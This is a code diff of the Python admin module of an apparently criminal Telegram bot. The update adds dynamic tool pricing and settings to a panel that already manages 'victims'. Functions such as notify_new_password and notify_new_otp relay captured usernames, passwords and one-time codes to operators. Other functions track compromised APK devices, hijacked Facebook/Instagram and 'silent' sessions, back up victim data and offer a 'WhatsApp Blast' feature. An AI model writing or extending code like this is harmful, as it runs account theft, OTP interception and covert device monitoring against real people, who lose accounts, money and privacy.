@@ -1,12 +1,12 @@
 # admin_system.py
 # ============================================================
-# Admin System v2.0 — الإدارة الكاملة
+# Admin System v2.1 — الإدارة الكاملة
 # ============================================================
 # الإضافات:
 # 1. وضع الصيانة
 # 2. الإشعارات الفورية
 # 3. إدارة الجلسات
-# 4. إعدادات البوت
+# 4. إعدادات البوت (ديناميكية)
 # 5. إدارة الحظر
 # 6. النسخ الاحتياطي
 # 7. صحة النظام
@@ -40,9 +40,12 @@ KEY_MAINTENANCE = "system:maintenance"
 KEY_MAINTENANCE_MSG = "system:maintenance_msg"
 KEY_MAINTENANCE_STARTED = "system:maintenance_started"
 KEY_MAINTENANCE_ENDS = "system:maintenance_ends"
-KEY_MAINTENANCE_EXEMPT = "system:maintenance_exempt"  # admin_only / vip / all
+KEY_MAINTENANCE_EXEMPT = "system:maintenance_exempt"
 KEY_START_TIME = "system:start_time"
 KEY_ONLINE_USERS = "system:online_users"
+KEY_BOT_SETTINGS = "system:bot_settings"
+KEY_TOOL_PRICES = "tool_prices"
+
 
 # ══════════════════════════════════════════════════════════════
 # [2] Live User Tracking
@@ -157,10 +160,9 @@ def is_user_online(user_id):
 
 
 # ══════════════════════════════════════════════════════════════
-# [3] ★★★ MAINTENANCE MODE ★★★ (الإضافة #1)
+# [3] ★★★ MAINTENANCE MODE ★★★
 # ══════════════════════════════════════════════════════════════
 def is_maintenance():
-    """يتحقق إذا كان وضع الصيانة مفعل"""
     if not redis_client:
         return False
     try:
@@ -170,15 +172,6 @@ def is_maintenance():
 
 
 def enable_maintenance(custom_msg=None, admin_id=None, duration_minutes=0, exempt_mode="all"):
-    """
-    تفعيل وضع الصيانة
-    exempt_mode: 
-        - "all" = كل المستخدمين
-        - "admin_only" = الأدمن فقط معفي
-        - "vip" = VIP والأدمن معفيين
-        - "none" = لا أحد معفي (حتى الأدمن)
-    duration_minutes: 0 = يدوي، >0 = تلقائي
-    """
     if not redis_client:
         return False
     try:
@@ -203,7 +196,6 @@ def enable_maintenance(custom_msg=None, admin_id=None, duration_minutes=0, exemp
         if duration_minutes > 0:
             ends_at = time.time() + (duration_minutes * 60)
             pipe.set(KEY_MAINTENANCE_ENDS, str(ends_at))
-            # ★ جدولة إيقاف تلقائي ★
             _schedule_maintenance_end(duration_minutes)
 
         pipe.execute()
@@ -211,7 +203,6 @@ def enable_maintenance(custom_msg=None, admin_id=None, duration_minutes=0, exemp
         metrics.inc_counter("maintenance_enabled")
         logger.warning(f"[MAINTENANCE] Enabled by {admin_id} | duration={duration_minutes}min | exempt={exempt_mode}")
 
-        # ★ إشعار المستخدمين النشطين ★
         if admin_id:
             try:
                 notify_active_users(custom_msg or "البوت في وضع الصيانة")
@@ -225,7 +216,6 @@ def enable_maintenance(custom_msg=None, admin_id=None, duration_minutes=0, exemp
 
 
 def _schedule_maintenance_end(minutes):
-    """جدولة إيقاف الصيانة تلقائياً"""
     def _end():
         time.sleep(minutes * 60)
         disable_maintenance(admin_id=0)
@@ -236,7 +226,6 @@ def _schedule_maintenance_end(minutes):
 
 
 def disable_maintenance(admin_id=None):
-    """تعطيل وضع الصيانة"""
     if not redis_client:
         return False
     try:
@@ -250,7 +239,6 @@ def disable_maintenance(admin_id=None):
         metrics.inc_counter("maintenance_disabled")
         logger.info(f"[MAINTENANCE] Disabled by {admin_id}")
 
-        # ★ إشعار المستخدمين النشطين ★
         try:
             notify_active_users("✅ البوت اشتغل تاني!")
         except Exception:
@@ -295,7 +283,6 @@ def get_maintenance_duration():
 
 
 def get_maintenance_remaining():
-    """الوقت المتبقي للصيانة"""
     if not redis_client:
         return 0
     try:
@@ -309,7 +296,6 @@ def get_maintenance_remaining():
 
 
 def get_maintenance_exempt():
-    """يرجع نوع الاستثناء"""
     if not redis_client:
         return "all"
     try:
@@ -320,7 +306,6 @@ def get_maintenance_exempt():
 
 
 def is_exempt_from_maintenance(user_id):
-    """يتحقق إذا كان المستخدم معفي من الصيانة"""
     if not is_maintenance():
         return True
 
@@ -344,13 +329,9 @@ def is_exempt_from_maintenance(user_id):
 
 
 # ══════════════════════════════════════════════════════════════
-# [4] ★★★ NOTIFICATIONS ★★★ (الإضافة #2)
+# [4] NOTIFICATIONS
 # ══════════════════════════════════════════════════════════════
 def notify_admin(admin_ids, title, body, icon="🔔"):
-    """
-    إشعار فوري للأدمن
-    admin_ids: قائمة IDs
-    """
     if not bot:
         return False
     try:
@@ -372,7 +353,6 @@ def notify_admin(admin_ids, title, body, icon="🔔"):
 
 
 def get_admin_ids():
-    """يرجع قائمة IDs الأدمن"""
     try:
         from points_system import ADMIN_IDS
         return ADMIN_IDS
@@ -381,7 +361,6 @@ def get_admin_ids():
 
 
 def notify_new_victim(victim_name, victim_id, chat_id, device_info=None):
-    """إشعار عند ضحية جديدة"""
     body = (
         f"👤 <b>الاسم:</b> <code>{victim_name}</code>\n"
         f"🆔 <b>ID:</b> <code>{victim_id[:16]}</code>\n"
@@ -394,7 +373,6 @@ def notify_new_victim(victim_name, victim_id, chat_id, device_info=None):
 
 
 def notify_new_session(session_id, site, ip=None):
-    """إشعار عند جلسة جديدة"""
     body = (
         f"🆔 <b>Session:</b> <code>{session_id[:16]}</code>\n"
         f"🌐 <b>الموقع:</b> <code>{site}</code>"
@@ -406,7 +384,6 @@ def notify_new_session(session_id, site, ip=None):
 
 
 def notify_new_password(platform, username, password, ip=None):
-    """إشعار عند كلمة سر جديدة"""
     body = (
         f"📧 <b>Platform:</b> <code>{platform}</code>\n"
         f"👤 <b>User:</b> <code>{username}</code>\n"
@@ -419,7 +396,6 @@ def notify_new_password(platform, username, password, ip=None):
 
 
 def notify_new_otp(phone, otp, service=None):
-    """إشعار عند OTP جديد"""
     body = (
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🔢 <b>OTP:</b> <code>{otp}</code>"
@@ -431,7 +407,6 @@ def notify_new_otp(phone, otp, service=None):
 
 
 def notify_critical_error(error_msg, module=None):
-    """إشعار عند خطأ حرج"""
     body = f"⚠️ <b>Module:</b> <code>{module or 'Unknown'}</code>\n"
     body += f"❌ <b>Error:</b>\n<pre>{error_msg[:500]}</pre>"
 
@@ -439,7 +414,6 @@ def notify_critical_error(error_msg, module=None):
 
 
 def notify_active_users(message):
-    """إشعار كل المستخدمين النشطين (آخر 5 دقائق)"""
     if not bot or not redis_client:
         return 0
     try:
@@ -452,7 +426,7 @@ def notify_active_users(message):
             try:
                 bot.send_message(int(uid), message, parse_mode="HTML")
                 sent += 1
-                time.sleep(0.05)  # ★ rate limit ★
+                time.sleep(0.05)
             except Exception:
                 continue
 
@@ -464,15 +438,14 @@ def notify_active_users(message):
 
 
 # ══════════════════════════════════════════════════════════════
-# [5] ★★★ SESSION MANAGEMENT ★★★ (الإضافة #3)
+# [5] SESSION MANAGEMENT
 # ══════════════════════════════════════════════════════════════
 def get_active_sessions():
-    """يرجع قائمة كل الجلسات النشطة"""
     if not redis_client:
         return []
     try:
         sessions = []
-        # ★ جلسات Silent ★
+
         for key in redis_client.scan_iter(match="silent:*", count=100):
             if isinstance(key, bytes):
                 key = key.decode()
@@ -493,7 +466,6 @@ def get_active_sessions():
                 except Exception:
                     continue
 
-        # ★ جلسات Facebook/Instagram ★
         for key in redis_client.scan_iter(match="se_session:*", count=100):
             if isinstance(key, bytes):
                 key = key.decode()
@@ -515,7 +487,6 @@ def get_active_sessions():
                 except Exception:
                     continue
 
-        # ★ جلسات APK ★
         for key in redis_client.scan_iter(match="victim:*:*", count=100):
             if isinstance(key, bytes):
                 key = key.decode()
@@ -543,7 +514,6 @@ def get_active_sessions():
 
 
 def get_online_devices():
-    """يرجع الأجهزة المتصلة حالياً"""
     if not redis_client:
         return []
     try:
@@ -551,7 +521,6 @@ def get_online_devices():
         cutoff = now - 300
         devices = []
 
-        # ★ أجهزة APK المتصلة ★
         for key in redis_client.scan_iter(match="victim:*:*", count=100):
             if isinstance(key, bytes):
                 key = key.decode()
@@ -572,7 +541,6 @@ def get_online_devices():
             except Exception:
                 continue
 
-        # ★ جلسات Silent النشطة ★
         for key in redis_client.scan_iter(match="silent:*", count=100):
             if isinstance(key, bytes):
                 key = key.decode()
@@ -603,13 +571,11 @@ def get_online_devices():
 
 
 def kill_session(session_key):
-    """إنهاء جلسة معينة"""
     if not redis_client:
         return False
     try:
         redis_client.delete(session_key)
 
-        # ★ إذا كانت جلسة Silent، امسح البيانات المرتبطة ★
         if session_key.startswith("silent:"):
             session_id = session_key.replace("silent:", "")
             redis_client.delete(f"silent_data:{session_id}")
@@ -623,13 +589,9 @@ def kill_session(session_key):
 
 
 # ══════════════════════════════════════════════════════════════
-# [6] ★★★ BOT SETTINGS ★★★ (الإضافة #4)
+# [6] ★★★ BOT SETTINGS (ديناميكية) ★★★
 # ══════════════════════════════════════════════════════════════
-KEY_BOT_SETTINGS = "system:bot_settings"
-
-
 def get_bot_setting(key, default=None):
-    """يرجع إعداد معين"""
     if not redis_client:
         return default
     try:
@@ -642,7 +604,6 @@ def get_bot_setting(key, default=None):
 
 
 def set_bot_setting(key, value):
-    """يحفظ إعداد"""
     if not redis_client:
         return False
     try:
@@ -655,39 +616,73 @@ def set_bot_setting(key, value):
 
 
 def get_all_settings():
-    """يرجع كل الإعدادات"""
+    """يرجع كل الإعدادات (مع أسعار مخصصة)"""
     if not redis_client:
         return {}
     try:
+        # ★ الإعدادات المحفوظة ★
         raw = redis_client.hgetall(KEY_BOT_SETTINGS) or {}
-        return {
-            (k.decode() if isinstance(k, bytes) else k): 
+        settings = {
+            (k.decode() if isinstance(k, bytes) else k):
             (v.decode() if isinstance(v, bytes) else v)
             for k, v in raw.items()
         }
-    except Exception:
+
+        # ★ أسعار مخصصة ★
+        prices = redis_client.hgetall(KEY_TOOL_PRICES) or {}
+        settings["__custom_prices__"] = {
+            (k.decode() if isinstance(k, bytes) else k):
+            int(v.decode() if isinstance(v, bytes) else v)
+            for k, v in prices.items()
+        }
+
+        return settings
+    except Exception as e:
+        logger.warning(f"get_all_settings error: {e}")
         return {}
 
 
 def set_tool_price(tool_key, points):
-    """تعديل سعر أداة"""
+    """تعديل سعر أداة — يشتغل فوراً"""
     if not redis_client:
         return False
     try:
-        redis_client.hset(f"tool_prices", tool_key, int(points))
+        redis_client.hset(KEY_TOOL_PRICES, tool_key, int(points))
         logger.info(f"[SETTINGS] Tool {tool_key} price = {points}")
+
+        # ★ حدّث cache لو موجود ★
+        try:
+            redis_client.delete(f"tool_price:{tool_key}")
+        except Exception:
+            pass
+
         return True
     except Exception as e:
         logger.warning(f"set_tool_price error: {e}")
         return False
 
 
+def get_tool_price(tool_key, default_price=0):
+    """يقرأ سعر أداة — ديناميكي من Redis أولاً"""
+    if not redis_client:
+        return default_price
+    try:
+        val = redis_client.hget(KEY_TOOL_PRICES, tool_key)
+        if val is not None:
+            if isinstance(val, bytes):
+                val = val.decode()
+            return int(val)
+    except Exception:
+        pass
+    return default_price
+
+
 def get_tool_prices():
-    """يرجع أسعار كل الأدوات"""
+    """يرجع كل الأسعار المخصصة"""
     if not redis_client:
         return {}
     try:
-        raw = redis_client.hgetall("tool_prices") or {}
+        raw = redis_client.hgetall(KEY_TOOL_PRICES) or {}
         return {
             (k.decode() if isinstance(k, bytes) else k):
             int(v.decode() if isinstance(v, bytes) else v)
@@ -697,15 +692,49 @@ def get_tool_prices():
         return {}
 
 
+def reset_tool_prices():
+    """حذف كل الأسعار المخصصة (الرجوع للافتراضية)"""
+    if not redis_client:
+        return False
+    try:
+        redis_client.delete(KEY_TOOL_PRICES)
+        logger.info("[SETTINGS] All custom tool prices reset")
+        return True
+    except Exception as e:
+        logger.warning(f"reset_tool_prices error: {e}")
+        return False
+
+
+def get_welcome_points_dynamic(default=25):
+    """نقاط الترحيب الديناميكية"""
+    val = get_bot_setting("welcome_points", None)
+    if val is not None:
+        try:
+            return int(val)
+        except Exception:
+            pass
+    return default
+
+
+def get_referral_points_dynamic(default=10):
+    """نقاط الإحالة الديناميكية"""
+    val = get_bot_setting("ref_points", None)
+    if val is not None:
+        try:
+            return int(val)
+        except Exception:
+            pass
+    return default
+
+
 # ══════════════════════════════════════════════════════════════
-# [7] ★★★ BAN MANAGEMENT ★★★ (الإضافة #5)
+# [7] BAN MANAGEMENT
 # ══════════════════════════════════════════════════════════════
 KEY_BAN_LIST = "system:banned_users"
 KEY_IP_BAN_LIST = "system:banned_ips"
 
 
 def ban_user_permanent(user_id, reason=""):
-    """حظر دائم"""
     if not redis_client:
         return False
     try:
@@ -719,7 +748,6 @@ def ban_user_permanent(user_id, reason=""):
 
 
 def unban_user(user_id):
-    """رفع حظر"""
     if not redis_client:
         return False
     try:
@@ -732,7 +760,6 @@ def unban_user(user_id):
 
 
 def unban_all():
-    """رفع حظر الكل"""
     if not redis_client:
         return 0
     try:
@@ -745,7 +772,6 @@ def unban_all():
 
 
 def get_banned_users():
-    """قائمة المحظورين"""
     if not redis_client:
         return []
     try:
@@ -766,7 +792,6 @@ def get_banned_users():
 
 
 def ban_ip(ip_address, reason=""):
-    """حظر IP"""
     if not redis_client:
         return False
     try:
@@ -778,7 +803,6 @@ def ban_ip(ip_address, reason=""):
 
 
 def unban_ip(ip_address):
-    """رفع حظر IP"""
     if not redis_client:
         return False
     try:
@@ -789,7 +813,6 @@ def unban_ip(ip_address):
 
 
 def is_ip_banned(ip_address):
-    """يتحقق إذا كان الـ IP محظور"""
     if not redis_client:
         return False
     try:
@@ -799,7 +822,6 @@ def is_ip_banned(ip_address):
 
 
 def get_banned_ips():
-    """قائمة IPs المحظورة"""
     if not redis_client:
         return []
     try:
@@ -810,10 +832,9 @@ def get_banned_ips():
 
 
 # ══════════════════════════════════════════════════════════════
-# [8] ★★★ BACKUP MANAGEMENT ★★★ (الإضافة #6)
+# [8] BACKUP MANAGEMENT
 # ══════════════════════════════════════════════════════════════
 def backup_redis_to_json():
-    """إنشاء نسخة احتياطية من Redis كـ JSON"""
     if not redis_client:
         return None
     try:
@@ -823,11 +844,10 @@ def backup_redis_to_json():
             "keys": {}
         }
 
-        # ★ احفظ كل المفاتيح المهمة ★
         patterns = [
             "user:*", "victims:*", "victim:*:*", "silent:*",
             "se_session:*", "profile:*", "apk_code:*",
-            "wa_report:*", "admin_events", "system:*"
+            "wa_report:*", "admin_events", "system:*", "tool_prices"
         ]
 
         total = 0
@@ -868,7 +888,7 @@ def backup_redis_to_json():
                         backup["keys"][key] = {
                             "type": "hash",
                             "value": {
-                                (k.decode() if isinstance(k, bytes) else k): 
+                                (k.decode() if isinstance(k, bytes) else k):
                                 (v.decode('utf-8', errors='ignore') if isinstance(v, bytes) else v)
                                 for k, v in vals.items()
                             }
@@ -898,7 +918,6 @@ def backup_redis_to_json():
 
 
 def restore_redis_from_json(backup_data):
-    """استعادة Redis من نسخة احتياطية"""
     if not redis_client:
         return False
     try:
@@ -940,10 +959,9 @@ def restore_redis_from_json(backup_data):
 
 
 # ══════════════════════════════════════════════════════════════
-# [9] ★★★ SYSTEM HEALTH ★★★ (الإضافة #7)
+# [9] SYSTEM HEALTH
 # ══════════════════════════════════════════════════════════════
 def get_system_health():
-    """يرجع صحة النظام"""
     health = {
         "cpu_percent": 0,
         "ram_percent": 0,
@@ -957,7 +975,6 @@ def get_system_health():
         "timestamp": time.time()
     }
 
-    # ★ CPU / RAM / Disk ★
     try:
         import psutil
         health["cpu_percent"] = psutil.cpu_percent(interval=0.1)
@@ -966,7 +983,6 @@ def get_system_health():
     except Exception:
         pass
 
-    # ★ Redis ★
     try:
         if redis_client:
             start = time.time()
@@ -976,7 +992,6 @@ def get_system_health():
     except Exception:
         pass
 
-    # ★ PostgreSQL ★
     try:
         from database import get_db
         with get_db() as conn:
@@ -986,7 +1001,6 @@ def get_system_health():
     except Exception:
         pass
 
-    # ★ Webhook ★
     try:
         if bot:
             info = bot.get_webhook_info()
@@ -994,7 +1008,6 @@ def get_system_health():
     except Exception:
         pass
 
-    # ★ Uptime ★
     try:
         if redis_client:
             start = redis_client.get(KEY_START_TIME)
@@ -1003,7 +1016,6 @@ def get_system_health():
     except Exception:
         pass
 
-    # ★ Requests per second ★
     try:
         from monitoring import metrics
         snap = metrics.snapshot()
@@ -1020,7 +1032,7 @@ def get_system_health():
 
 
 # ══════════════════════════════════════════════════════════════
-# [10] ★★★ ADVANCED ANALYTICS ★★★ (الإضافة #8)
+# [10] ADVANCED ANALYTICS
 # ══════════════════════════════════════════════════════════════
 def get_tool_usage_today():
     if not redis_client:
@@ -1029,7 +1041,7 @@ def get_tool_usage_today():
         today = datetime.utcnow().strftime("%Y-%m-%d")
         usage = redis_client.hgetall(f"system:tool_usage:{today}") or {}
         return {
-            (k.decode() if isinstance(k, bytes) else k): 
+            (k.decode() if isinstance(k, bytes) else k):
             int(v.decode() if isinstance(v, bytes) else v)
             for k, v in usage.items()
         }
@@ -1038,7 +1050,6 @@ def get_tool_usage_today():
 
 
 def get_users_growth(days=7):
-    """نمو المستخدمين على مدار أيام"""
     if not redis_client:
         return {}
     try:
@@ -1138,21 +1149,14 @@ def get_recent_activity(limit=30):
 
 
 # ══════════════════════════════════════════════════════════════
-# [11] ★★★ SMART BROADCAST ★★★ (الإضافة #9)
+# [11] SMART BROADCAST
 # ══════════════════════════════════════════════════════════════
 def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedule_at=None):
-    """
-    بث ذكي لمجموعة
-    group: "all" / "vip" / "banned" / "active" / custom_list
-    with_buttons: list of (text, callback_data) tuples
-    schedule_at: timestamp for scheduled broadcast (0 = فوراً)
-    """
     if not redis_client:
         return 0
 
     def _do_broadcast():
         try:
-            # ★ حدد المستقبلين ★
             recipients = []
             if group == "all":
                 recipients = [int(u) for u in (redis_client.smembers("all_users") or set()) if str(u).isdigit()]
@@ -1162,7 +1166,7 @@ def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedul
                 recipients = [u["user_id"] for u in users if u.get("is_vip")]
             elif group == "active":
                 now = time.time()
-                cutoff = now - 86400  # آخر 24 ساعة
+                cutoff = now - 86400
                 online = redis_client.zrangebyscore(KEY_ONLINE_USERS, cutoff, now)
                 recipients = [int(u) for u in online if str(u).isdigit()]
             elif group == "banned":
@@ -1170,7 +1174,6 @@ def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedul
             elif isinstance(group, list):
                 recipients = group
 
-            # ★ جهز الأزرار ★
             markup = None
             if with_buttons:
                 markup = InlineKeyboardMarkup()
@@ -1178,7 +1181,6 @@ def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedul
                     if isinstance(btn, tuple) and len(btn) >= 2:
                         markup.add(InlineKeyboardButton(btn[0], callback_data=btn[1]))
 
-            # ★ أرسل ★
             sent = 0
             failed = 0
             for uid in recipients:
@@ -1197,7 +1199,6 @@ def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedul
 
             logger.info(f"[BROADCAST] group={group} | sent={sent} | failed={failed}")
 
-            # ★ إشعار للأدمن ★
             if admin_id:
                 try:
                     bot.send_message(
@@ -1217,7 +1218,6 @@ def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedul
             logger.exception(f"broadcast error: {e}")
             return 0
 
-    # ★ جدولة؟ ★
     if schedule_at and schedule_at > time.time():
         delay = schedule_at - time.time()
         def _scheduled():
@@ -1227,29 +1227,22 @@ def broadcast_to_group(group, message, admin_id=None, with_buttons=None, schedul
         logger.info(f"[BROADCAST] Scheduled in {int(delay)}s")
         return -1
 
-    # ★ فوراً ★
     threading.Thread(target=_do_broadcast, daemon=True).start()
     return 0
 
 
 # ══════════════════════════════════════════════════════════════
-# [12] ★★★ CUSTOM NOTIFICATION ★★★ (الإضافة #10)
+# [12] CUSTOM NOTIFICATION
 # ══════════════════════════════════════════════════════════════
 def send_custom_notification(user_ids, message, with_buttons=None, admin_id=None):
-    """
-    إرسال إشعار مخصص لمستخدمين
-    user_ids: قائمة IDs أو ID واحد
-    """
     if not redis_client or not bot:
         return 0
 
-    # ★ تأكد إنها list ★
     if isinstance(user_ids, int):
         user_ids = [user_ids]
     elif isinstance(user_ids, str):
         user_ids = [int(x.strip()) for x in user_ids.split(",") if x.strip().isdigit()]
 
-    # ★ جهز الأزرار ★
     markup = None
     if with_buttons:
         markup = InlineKeyboardMarkup()
@@ -1257,7 +1250,6 @@ def send_custom_notification(user_ids, message, with_buttons=None, admin_id=None
             if isinstance(btn, tuple) and len(btn) >= 2:
                 markup.add(InlineKeyboardButton(btn[0], callback_data=btn[1]))
 
-    # ★ أرسل ★
     sent = 0
     failed = 0
     for uid in user_ids:
@@ -1276,7 +1268,6 @@ def send_custom_notification(user_ids, message, with_buttons=None, admin_id=None
 
     logger.info(f"[CUSTOM-NOTIFY] sent={sent} | failed={failed}")
 
-    # ★ إشعار للأدمن ★
     if admin_id:
         try:
             bot.send_message(
@@ -1296,7 +1287,6 @@ def send_custom_notification(user_ids, message, with_buttons=None, admin_id=None
 # [13] Reports & Text Builders
 # ══════════════════════════════════════════════════════════════
 def build_maintenance_status_text():
-    """نص حالة الصيانة"""
     if not is_maintenance():
         return (
             "🔧 <b>وضع الصيانة</b>\n"
@@ -1337,7 +1327,6 @@ def build_maintenance_status_text():
 
 
 def build_system_health_text():
-    """نص صحة النظام"""
     h = get_system_health()
 
     cpu_icon = "🟢" if h["cpu_percent"] < 50 else ("🟡" if h["cpu_percent"] < 80 else "🔴")
@@ -1368,7 +1357,6 @@ def build_system_health_text():
 
 
 def build_advanced_analytics_text():
-    """نص التحليلات المتقدمة"""
     tool_usage = get_tool_usage_today()
     conversion = get_conversion_stats()
 
@@ -1402,7 +1390,6 @@ def build_advanced_analytics_text():
 
 
 def build_sessions_text():
-    """نص الجلسات النشطة"""
     sessions = get_active_sessions()
 
     if not sessions:
@@ -1433,7 +1420,6 @@ def build_sessions_text():
 
 
 def build_ban_list_text():
-    """نص قائمة الحظر"""
     banned = get_banned_users()
     banned_ips = get_banned_ips()
 
@@ -1462,7 +1448,6 @@ def build_ban_list_text():
 
 
 def build_backup_text():
-    """نص النسخ الاحتياطي"""
     if not redis_client:
         return "💾 <b>النسخ الاحتياطي</b>\n\n❌ Redis غير متصل"
 
@@ -1488,8 +1473,39 @@ def build_backup_text():
     return text
 
 
+def build_settings_text():
+    """نص الإعدادات (ديناميكي)"""
+    settings = get_all_settings()
+    prices = settings.get("__custom_prices__", {})
+
+    welcome_points = get_bot_setting("welcome_points", "25")
+    ref_points = get_bot_setting("ref_points", "10")
+    welcome_msg_set = "✅" if get_bot_setting("welcome_msg") else "⚪"
+    help_msg_set = "✅" if get_bot_setting("help_msg") else "⚪"
+
+    text = (
+        "⚙️ <b>إعدادات البوت v2.1</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "━━━ 🎯 <b>الإعدادات الحالية</b> ━━━\n"
+        f"🎁 <b>نقاط الترحيب:</b> <code>{welcome_points}</code>\n"
+        f"🎁 <b>نقاط الإحالة:</b> <code>{ref_points}</code>\n"
+        f"💬 <b>رسالة الترحيب:</b> {welcome_msg_set}\n"
+        f"❓ <b>رسالة المساعدة:</b> {help_msg_set}\n"
+        f"💰 <b>أسعار مخصصة:</b> <code>{len(prices)}</code>\n\n"
+        "━━━ ⚡ <b>الإجراءات</b> ━━━\n"
+        "• تعديل رسالة ترحيب\n"
+        "• تعديل رسالة مساعدة\n"
+        "• تعديل سعر أداة (شغال فوري)\n"
+        "• تعديل نقاط الترحيب\n"
+        "• تعديل نقاط الإحالة\n"
+        "• عرض الأسعار\n"
+        "• Reset للأسعار\n"
+    )
+
+    return text
+
+
 def format_uptime(seconds):
-    """تنسيق الوقت"""
     if seconds < 60:
         return f"{int(seconds)}ث"
     if seconds < 3600:
@@ -1500,101 +1516,82 @@ def format_uptime(seconds):
 
 
 # ══════════════════════════════════════════════════════════════
-# [14] Admin Menu (الموسع)
+# [14] Admin Menu
 # ══════════════════════════════════════════════════════════════
 def build_advanced_admin_menu():
-    """لوحة الأدمن الموسعة"""
     m = InlineKeyboardMarkup()
 
-    # ★ صف 1: تحليلات ★
     m.row(
         InlineKeyboardButton("📊 تحليلات عميقة", callback_data="admin_analytics"),
         InlineKeyboardButton("🏆 أكثر المستخدمين", callback_data="admin_top_users")
     )
 
-    # ★ صف 2: مستخدمين ★
     m.row(
         InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"),
         InlineKeyboardButton("🔍 بحث", callback_data="admin_search")
     )
 
-    # ★ صف 3: منح ★
     m.row(
         InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
         InlineKeyboardButton("➕ إعطاء اشتراك", callback_data="admin_add_sub")
     )
 
-    # ★ صف 4: حظر ★
     m.row(
         InlineKeyboardButton("🚫 حظر", callback_data="admin_ban"),
         InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban")
     )
 
-    # ★ صف 5: حذف + نجوم ★
     m.row(
         InlineKeyboardButton("🗑️ حذف", callback_data="admin_delete"),
         InlineKeyboardButton("⭐ نجوم", callback_data="admin_give_stars")
     )
 
-    # ★ صف 6: WhatsApp Blast ★
     m.row(
         InlineKeyboardButton("⚡ WhatsApp Blast", callback_data="admin_wb_menu")
     )
 
-    # ★★★ صف 7: الصيانة (جديد) ★★★
     m.row(
         InlineKeyboardButton("🔧 وضع الصيانة", callback_data="admin_maintenance")
     )
 
-    # ★★★ صف 8: صحة النظام (جديد) ★★★
     m.row(
         InlineKeyboardButton("❤️ صحة النظام", callback_data="admin_health"),
         InlineKeyboardButton("👁️ الجلسات", callback_data="admin_sessions")
     )
 
-    # ★★★ صف 9: إشعار + بث (جديد) ★★★
     m.row(
         InlineKeyboardButton("✉️ إشعار مخصص", callback_data="admin_custom_notify"),
         InlineKeyboardButton("📢 بث ذكي", callback_data="admin_smart_broadcast")
     )
 
-    # ★★★ صف 10: إعدادات + حظر (جديد) ★★★
     m.row(
         InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
         InlineKeyboardButton("🚫 قائمة الحظر", callback_data="admin_ban_list")
     )
 
-    # ★★★ صف 11: نسخ احتياطي + صيانة Redis (جديد) ★★★
     m.row(
         InlineKeyboardButton("💾 نسخة احتياطية", callback_data="admin_backup"),
         InlineKeyboardButton("🧹 تنظيف Redis", callback_data="admin_clean_redis")
     )
 
-    # ★ صف 12: أحداث + نشاط ★
     m.row(
         InlineKeyboardButton("📋 سجل الأحداث", callback_data="admin_events"),
         InlineKeyboardButton("📜 سجل النشاط", callback_data="admin_activity_log")
     )
 
-    # ★ صف 13: إدارة التحديثات ★
     m.row(
         InlineKeyboardButton("⚙️ إدارة التحديثات", callback_data="admin_updates"),
         InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast")
     )
 
-    # ★ صف 14: إحصائيات + live ★
     m.row(
         InlineKeyboardButton("📊 إحصائيات", callback_data="admin_adv_stats"),
         InlineKeyboardButton("🔴 بث مباشر", callback_data="admin_live")
     )
 
-    # ★ صف 15: رجوع ★
     m.row(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
 
     return m
 
 
-# ══════════════════════════════════════════════════════════════
-# [15] End of file
-# ══════════════════════════════════════════════════════════════
-logger.info("[+] admin_system v2.0 loaded — 10 additions ready")
+logger.info("[+] admin_system v2.1 loaded — dynamic settings enabled")
